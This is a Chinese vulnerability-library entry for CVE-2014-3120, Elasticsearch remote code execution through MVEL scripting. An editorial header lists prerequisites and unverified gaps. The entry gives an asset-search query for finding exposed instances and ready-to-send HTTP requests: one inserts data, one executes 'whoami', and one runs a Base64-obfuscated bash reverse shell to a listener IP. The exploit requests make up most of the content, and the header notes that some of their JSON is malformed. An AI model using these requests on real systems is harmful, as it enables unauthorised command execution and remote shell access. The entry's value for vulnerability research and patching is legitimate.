---
source: "wy876 漏洞文库"
title: "Elasticsearch存在未授权访问导致的RCE"
product: "Elasticsearch MVEL脚本引擎"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2014-3120"
referenced_identifiers: ""
identifier_role: "primary"
cve: "CVE-2014-3120"
prerequisites: "旧版动态MVEL启用、API可达且查询有匹配文档"
source_status: "unknown"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-7c6019acb8636b37e7b5d597"
entity_id: "ve-7c6019acb8636b37e7b5d597"
schema_version: "1"
---

# Elasticsearch存在未授权访问导致的RCE

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：旧版动态MVEL启用、API可达且查询有匹配文档
- 证据范围：与359/364同MVEL漏洞，不能把所有Elasticsearch未授权访问都等同RCE。

### 本次正文校订

- 按实际内容修正 3 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 版本仅产品名，默认MVEL是历史行为不能推广所有版本
- 两个执行请求JSON末尾多出两组大括号，非法JSON
- 所有Host为空且长度硬编码
- 反弹载荷为不透明Base64字面量，只按原文阅读未解码；需要核实其命令而不可视已执行证据
- 插入数据和反弹副作用无清理，原文未提供任何结果

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞描述
Elasticsearch向使用者提供执行脚本代码的功能，支持mvel, js,groovy,python,和native语言，默认脚本语言为mvel。由于mvel语言功能较为强大，可以直接执行java代码，而且官方默认没有关闭用户可通过http操控这一功能的接口（script.disable_dynamic），从而导致恶意用户可以通过这个功能远程执行任意Java代码。

# 二、影响版本
Elasticsearch

# 三、资产测绘
```plain
app="Elasticsearch"
```


# 三、漏洞复现
1、利用该漏洞要求Elasticsearch中有数据，所以先创建一条数据

```http
POST /website/blog/ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

{
    "name": "colleget"
}
```


2、执行命令

```http
POST /_search?pretty HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 372

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
    }
}
```


3、反弹shell

```http
POST /_search?pretty HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 372

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"bash -c {echo,YmFaaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjcwLzc1MzIgMD4mMQ==}|{base64,-d}|{bash,-i}\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
    }
}

```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kg7yzqstede6zu7x>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
